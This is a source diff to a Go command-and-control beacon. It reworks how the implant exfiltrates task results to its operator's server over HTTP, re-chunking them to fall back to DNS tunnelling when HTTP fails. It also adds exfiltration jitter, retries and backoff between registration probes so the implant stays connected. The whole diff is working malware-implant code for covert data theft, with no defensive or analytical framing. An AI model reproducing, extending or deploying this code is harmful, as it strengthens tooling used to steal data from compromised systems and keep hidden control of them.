@@ -8,6 +8,7 @@ import (
 	"context"
 	"crypto/md5"
 	crand "crypto/rand"
+	"errors"
 	"fmt"
 	"math/rand"
 	"os"
@@ -476,17 +477,67 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	// Chunk sizing is transport-dependent. On DNS the ceiling comes from label
 	// and FQDN budgets; on HTTP it comes from the operator's configured payload
-	// and the listener's body limit. A dual beacon sends results over HTTP, so
-	// it uses the HTTP budget unless it latched to DNS.
-	effective := "dns"
-	if b.transport != nil {
-		if m := b.transport.Mode(); m == transportHTTP || (m == transportDual && len(b.transport.transports) > 0) {
-			effective = "http"
-		}
-	}
-	safeRawChunk := b.client.config.ResultChunkSizeFor(effective)
+	// and the listener's body limit. A dual beacon tries HTTP first, so it uses
+	// the HTTP budget unless it latched to DNS.
+	effective := b.resultChunkTransport()
 
-	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
+	send := func(message string) (string, error) { return b.sendResultMessage(message, exfilPhase) }
+	chunkSize := b.client.config.ResultChunkSizeFor(effective)
+	err := b.sendResultFrames(result, taskID, chunkSize, effective, send)
+	if err == nil {
+		return nil
+	}
+
+	// A dual beacon in auto mode tried HTTP first. If HTTP never accepted the
+	// metadata, nothing of this result reached the server, so it is safe to
+	// re-chunk for DNS and retry. Without this the HTTP-sized DATA frame would be
+	// handed to the DNS fallback, where it cannot fit a query and the result
+	// silently disappears.
+	mode := strings.ToLower(b.client.config.ResultTransport)
+	auto := mode == "" || mode == "auto"
+	if auto && effective == "http" && errors.Is(err, errResultMetaNotSent) &&
+		b.transport != nil && b.transport.Mode() == transportDual {
+		dnsChunk := b.client.config.ResultChunkSizeFor("dns")
+		fmt.Fprintf(os.Stderr, "[Beacon] result over HTTP failed (%v); retrying over DNS with %d-byte chunks\n", err, dnsChunk)
+		dnsSend := func(message string) (string, error) { return b.client.sendPhaseCommand(message, exfilPhase) }
+		return b.sendResultFrames(result, taskID, dnsChunk, "dns", dnsSend)
+	}
+
+	return err
+}
+
+// resultChunkTransport is the transport a result will actually use, which is
+// what its chunk size must match. An explicit ResultTransport wins; otherwise a
+// dual beacon uses HTTP only while the manager considers HTTP usable. During an
+// HTTP backoff (or after a DNS latch) sizing for HTTP would produce a frame the
+// DNS path cannot carry.
+func (b *Beacon) resultChunkTransport() string {
+	switch strings.ToLower(b.client.config.ResultTransport) {
+	case "dns":
+		return "dns"
+	case "http":
+		return "http"
+	}
+	if b.transport != nil && b.transport.ShouldUseHTTP() {
+		return "http"
+	}
+	return "dns"
+}
+
+// errResultMetaNotSent marks a result whose first frame was never accepted, so
+// none of it reached the server and the whole result can be re-sent on another
+// transport. A failure after the metadata is a partial transfer and must not be
+// restarted blindly.
+var errResultMetaNotSent = errors.New("result metadata was not sent")
+
+// sendResultFrames writes one result with the given chunk size. The sender is
+// injected so the DNS retry can reuse the exact framing.
+func (b *Beacon) sendResultFrames(result, taskID string, chunkSize int, effective string, send func(string) (string, error)) error {
+	if chunkSize < 1 {
+		chunkSize = 1
+	}
+
+	totalChunks := (len(result) + chunkSize - 1) / chunkSize
 	if totalChunks == 0 {
 		totalChunks = 1
 	}
@@ -496,7 +547,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	var err error
 	metaSent := false
 	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
-		_, err = b.sendResultMessage(metaData, exfilPhase)
+		_, err = send(metaData)
 		if err == nil {
 			metaSent = true
 			break
@@ -507,7 +558,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	}
 
 	if !metaSent {
-		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
+		return fmt.Errorf("%w: %v", errResultMetaNotSent, err)
 	}
 
 	jitterMin := b.client.config.ExfilJitterMinMs
@@ -526,8 +577,8 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	failedChunks := 0
 	for i := 0; i < totalChunks; i++ {
-		start := i * safeRawChunk
-		end := start + safeRawChunk
+		start := i * chunkSize
+		end := start + chunkSize
 		if end > len(result) {
 			end = len(result)
 		}
@@ -538,7 +589,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 		chunkSent := false
 		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
-			_, err := b.sendResultMessage(chunkData, exfilPhase)
+			_, err := send(chunkData)
 			if err == nil {
 				chunkSent = true
 				break
@@ -567,7 +618,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
 	for attempt := 1; attempt <= 3; attempt++ {
-		_, err = b.sendResultMessage(completeData, exfilPhase)
+		_, err = send(completeData)
 		if err == nil {
 			return nil
 		}
@@ -660,6 +711,11 @@ func (b *Beacon) sendControlMessage(message string, phase PhaseConfig) (string, 
 	if b.transport.Mode() == transportHTTP {
 		return "", err
 	}
+	// Result DATA frames can be thousands during one exfil; logging each would
+	// drown the beacon. Log the frames that explain a transport switch.
+	if !strings.HasPrefix(message, "DATA|") {
+		fmt.Fprintf(os.Stderr, "[Beacon] %s over HTTP failed (%v); falling back to DNS\n", operationForMessage(message), err)
+	}
 	return b.client.sendPhaseCommand(message, phase)
 }
 
@@ -673,6 +729,11 @@ const dualProbeRetries = 3
 // single dropped packet does not wrongly mark a live transport dead.
 func (b *Beacon) probeRegistration(kind, checkInData string, regPhase PhaseConfig) bool {
 	for attempt := 0; attempt < dualProbeRetries; attempt++ {
+		// Back off between probes: three immediate attempts turn a listener that
+		// is still starting (or one slow DNS answer) into a permanent DNS latch.
+		if attempt > 0 {
+			time.Sleep(time.Duration(attempt) * time.Second)
+		}
 		var err error
 		switch kind {
 		case "dns":
@@ -721,14 +782,26 @@ func (b *Beacon) sendResultMessage(message string, phase PhaseConfig) (string, e
 	case "dns":
 		return b.client.sendPhaseCommand(message, phase)
 	case "http":
-		if b.transport == nil || b.transport.Mode() == transportDNS {
+		// Operator-forced HTTP must work even after a dual beacon latched to
+		// DNS: latching narrows check-ins, it does not remove the listener the
+		// operator explicitly asked to use for results.
+		if b.transport == nil || !b.transport.HasHTTP() {
 			return "", fmt.Errorf("result_transport=http, but this beacon has no HTTP transport")
 		}
 		timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
 		wireMessage := fmt.Sprintf("%s|%s", message, timestamp)
 		return b.transport.Send(operationForMessage(message), wireMessage)
 	default: // "" or "auto"
-		return b.sendControlMessage(message, phase)
+		// Results are sized for the transport that carries them. Falling back to
+		// DNS here would hand an HTTP-sized frame to the DNS client, which cannot
+		// fit a query; the result would look "sent" and never arrive. Try HTTP
+		// only and let exfiltrateResult re-chunk for DNS on failure.
+		if b.transport != nil && b.transport.ShouldUseHTTP() {
+			timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+			wireMessage := fmt.Sprintf("%s|%s", message, timestamp)
+			return b.transport.Send(operationForMessage(message), wireMessage)
+		}
+		return b.client.sendPhaseCommand(message, phase)
 	}
 }
 
